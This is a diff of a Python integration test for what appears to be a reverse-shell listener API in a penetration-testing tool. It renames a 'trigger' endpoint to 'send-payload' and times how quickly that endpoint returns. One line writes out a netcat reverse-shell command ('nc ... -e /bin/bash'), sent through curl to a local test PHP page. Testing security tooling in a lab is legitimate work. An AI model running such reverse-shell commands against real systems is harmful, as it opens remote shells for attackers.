@@ -1127,15 +1127,15 @@ echo "=== End of Payload ==="
         
         print(f"✅ Test session stopped successfully: {session_id}")
 
-    def test_10_trigger_action_non_blocking(self):
-        """Test the new trigger_action functionality for non-blocking reverse shell trigger"""
-        print("\n🎯 Test: Trigger action non-blocking reverse shell functionality")
+    def test_10_send_payload_non_blocking(self):
+        """Test the new send_payload functionality for non-blocking reverse shell payload execution"""
+        print("\n🎯 Test: Send payload non-blocking reverse shell functionality")
         
         # Ensure clean environment before test
         self.ensure_clean_environment()
         
         # Step 1: Create a listener session (WITHOUT establishing connection yet)
-        session_id = f"{self.session_prefix}_trigger_test"
+        session_id = f"{self.session_prefix}_payload_test"
         port = REVERSE_SHELL_CONFIG["alternative_port"]  # Use alternative port (4501)
         
         listener_data = {
@@ -1146,7 +1146,7 @@ echo "=== End of Payload ==="
         
         try:
             # Start the listener
-            print(f"🎧 Starting listener on port {port} for trigger test")
+            print(f"🎧 Starting listener on port {port} for payload test")
             listener_response = requests.post(
                 f"{self.base_url}/api/reverse-shell/listener/start", 
                 json=listener_data, 
@@ -1160,26 +1160,26 @@ echo "=== End of Payload ==="
             print(f"✅ Listener started: {session_id}")
             self.active_sessions.append(session_id)
             
-            # Step 2: Test the NON-BLOCKING trigger (this is the key test!)
-            # This command would normally block the server, but with trigger_action it should return immediately
-            trigger_command = f'curl -X POST http://localhost:8080/test_reverse_shell.php -H "Content-Type: application/json" -d "{{\\"command\\": \\"nc 172.17.0.1 {port} -e /bin/bash\\"}}"'
+            # Step 2: Test the NON-BLOCKING send payload (this is the key test!)
+            # This command would normally block the server, but with send_payload it should return immediately
+            payload_command = f'curl -X POST http://localhost:8080/test_reverse_shell.php -H "Content-Type: application/json" -d "{{\\"command\\": \\"nc 172.17.0.1 {port} -e /bin/bash\\"}}"'
             
-            print(f"🚀 Testing NON-BLOCKING trigger action with reverse shell command")
-            print(f"   Command: {trigger_command[:80]}...")
+            print(f"🚀 Testing NON-BLOCKING send payload with reverse shell command")
+            print(f"   Command: {payload_command[:80]}...")
             
             # Measure time to ensure it's truly non-blocking
             import time
             start_time = time.time()
             
-            # Call the new trigger_action endpoint
-            trigger_data = {
-                "trigger_command": trigger_command,
+            # Call the new send_payload endpoint
+            payload_data = {
+                "payload_command": payload_command,
                 "timeout": 15
             }
             
             response = requests.post(
-                f"{self.base_url}/api/reverse-shell/{session_id}/trigger",
-                json=trigger_data,
+                f"{self.base_url}/api/reverse-shell/{session_id}/send-payload",
+                json=payload_data,
                 timeout=TIMEOUTS["medium"]
             )
             
@@ -1190,7 +1190,7 @@ echo "=== End of Payload ==="
             self.assertEqual(response.status_code, 200)
             result = response.json()
             
-            # The trigger should return immediately with success
+            # The payload should return immediately with success
             self.assertTrue(result.get("success", False))
             self.assertEqual(result.get("session_id"), session_id)
             self.assertIn("background", result.get("message", "").lower())
@@ -1198,9 +1198,9 @@ echo "=== End of Payload ==="
             # Critical test: Response should be nearly immediate (< 3 seconds)
             # Note: We allow up to 3 seconds to account for network latency and Docker overhead
             self.assertLess(response_time, 3.0, 
-                           f"Trigger action took {response_time:.2f}s - should be non-blocking!")
+                           f"Send payload took {response_time:.2f}s - should be non-blocking!")
             
-            print(f"✅ Trigger action returned immediately in {response_time:.2f}s (non-blocking)")
+            print(f"✅ Send payload returned immediately in {response_time:.2f}s (non-blocking)")
             print(f"   Response: {result}")
             
             # Additional verification: The response time should be significantly faster than
@@ -1208,15 +1208,15 @@ echo "=== End of Payload ==="
             if response_time < 2.5:
                 print("✅ Response time is excellent (< 2.5s)")
             elif response_time < 3.0:
-                print("✅ Response time is acceptable (< 3.0s) - trigger is non-blocking")
+                print("✅ Response time is acceptable (< 3.0s) - payload send is non-blocking")
             else:
                 print("⚠️  Response time is higher than expected but still non-blocking")
             
             # Step 3: Wait for potential connection and verify listener is still responsive
             print("⏳ Waiting for potential reverse shell connection...")
-            time.sleep(6)  # Give time for trigger to potentially establish connection
+            time.sleep(6)  # Give time for payload to potentially establish connection
             
-            # Check if connection was established via the trigger
+            # Check if connection was established via the payload
             status_response = requests.get(
                 f"{self.base_url}/api/reverse-shell/{session_id}/status", 
                 timeout=TIMEOUTS["quick"]
